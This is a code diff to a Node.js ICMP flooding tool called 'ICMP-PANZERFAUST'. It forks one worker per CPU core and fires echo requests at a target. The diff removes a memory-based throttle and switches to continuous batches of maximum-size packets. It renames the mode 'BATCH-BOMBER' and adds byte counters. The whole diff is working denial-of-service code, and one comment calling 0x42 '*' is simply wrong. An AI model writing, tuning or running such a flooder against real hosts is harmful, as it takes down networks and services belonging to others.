@@ -15,11 +15,11 @@ const cores = os.cpus().length;
 const endTime = Date.now() + duration * 1000;
 
 if (cluster.isMaster) {
-  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0 };
+  let stats = { sent: 0, success: 0, failed: 0, maxpps: 0, bytesSent: 0 };
   let lastLatency = 'N/A';
 
   console.clear();
-  console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
+  console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}`);
   console.log(`Duration: ${duration}s`);
@@ -34,26 +34,26 @@ if (cluster.isMaster) {
         stats.sent += msg.sent;
         stats.success += msg.success;
         stats.failed += msg.failed;
+        stats.bytesSent += msg.bytesSent;
         if (msg.pps > stats.maxpps) stats.maxpps = msg.pps;
       }
     });
   }
 
-  // Live output every 2 seconds
   setInterval(() => {
     console.clear();
-    console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
+    console.log('ICMP-PANZERFAUST [BATCH-BOMBER]');
     console.log('--------------------------------------');
     console.log(`Success: ${stats.success}`);
     console.log(`Failed: ${stats.failed}`);
     console.log(`Max PPS: ${stats.maxpps}`);
-    console.log(`Total Sent: ${stats.sent}`);
+    console.log(`Total Sent Packets: ${stats.sent}`);
+    console.log(`Total Bytes Sent: ${(stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
     console.log(`Target Latency: ${lastLatency} ms`);
     console.log('--------------------------------------');
     stats.maxpps = 0;
   }, 2000);
 
-  // Ping check
   setInterval(() => {
     exec(`ping -c 1 ${target}`, (err, stdout) => {
       const match = stdout.match(/time=([\d.]+) ms/);
@@ -75,70 +75,62 @@ if (cluster.isMaster) {
   let success = 0;
   let failed = 0;
   let pps = 0;
+  let bytesSent = 0;
 
-  let safeMode = false;
-  let throttleUntil = 0;
+  // Max payload size: 65507 bytes
+  const payloadSize = 65507;
+  const totalPacketSize = 8 + payloadSize; // ICMP header + payload
 
-  function checksum(buf) {
+  // Create max size packet buffer once, then update seq
+  function createPacket(seqNum) {
+    const buf = Buffer.alloc(8 + payloadSize);
+    buf.writeUInt8(8, 0); // Type: Echo Request
+    buf.writeUInt8(0, 1); // Code
+    buf.writeUInt16BE(0, 2); // checksum placeholder
+    buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
+    buf.writeUInt16BE(seqNum & 0xffff, 6); // Seq
+
+    // Fill payload with random data for max size
+    for(let i=8; i<buf.length; i++) {
+      buf[i] = 0x42; // ASCII '*'
+    }
+
+    // Compute checksum
     let sum = 0;
-    for (let i = 0; i < buf.length; i += 2) sum += buf.readUInt16BE(i);
-    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
-    return ~sum & 0xffff;
-  }
+    for (let i = 0; i < buf.length; i += 2) {
+      sum += buf.readUInt16BE(i);
+    }
+    while (sum >> 16) {
+      sum = (sum & 0xffff) + (sum >> 16);
+    }
+    const checksum = (~sum) & 0xffff;
+    buf.writeUInt16BE(checksum, 2);
 
-  function packet(seq) {
-    const buf = Buffer.alloc(8);
-    buf.writeUInt8(8, 0);
-    buf.writeUInt8(0, 1);
-    buf.writeUInt16BE(0, 2);
-    buf.writeUInt16BE(process.pid & 0xffff, 4);
-    buf.writeUInt16BE(seq & 0xffff, 6);
-    buf.writeUInt16BE(checksum(buf), 2);
     return buf;
   }
 
-  function loop() {
+  function batchSend(count) {
     if (Date.now() >= endTime) return;
 
-    // Dynamic throttle based on memory
-    const mem = process.memoryUsage();
-    const usedMB = mem.heapUsed / 1024 / 1024;
-
-    if (!safeMode && usedMB > 700) {
-      safeMode = true;
-      throttleUntil = Date.now() + 10000;
-      console.log(`[Worker ${process.pid}] ENTERED SAFE MODE - RAM too high: ${usedMB.toFixed(1)}MB`);
+    for (let i = 0; i < count; i++) {
+      const pkt = createPacket(seq++);
+      socket.send(pkt, 0, pkt.length, target, (err) => {
+        sent++;
+        pps++;
+        bytesSent += pkt.length;
+        if (err) failed++;
+        else success++;
+      });
     }
 
-    if (safeMode && Date.now() > throttleUntil) {
-      safeMode = false;
-      console.log(`[Worker ${process.pid}] EXITED SAFE MODE - Resuming full power`);
-    }
-
-    const throttle = safeMode ? 1000 : 0;
-    const now = Date.now();
-
-    if (now >= endTime) return;
-
-    const pkt = packet(seq++);
-    socket.send(pkt, 0, pkt.length, target, (err) => {
-      sent++;
-      pps++;
-      if (err) failed++;
-      else success++;
-    });
-
-    if (throttle > 0) {
-      setTimeout(loop, throttle);
-    } else {
-      setImmediate(loop);
-    }
+    setImmediate(() => batchSend(count));
   }
 
-  loop();
+  // Start batch send: you can increase batch count here
+  batchSend(10);
 
   setInterval(() => {
-    process.send({ type: 'stats', sent, success, failed, pps });
-    sent = success = failed = pps = 0;
+    process.send({ type: 'stats', sent, success, failed, pps, bytesSent });
+    sent = success = failed = pps = bytesSent = 0;
   }, 2000);
 }
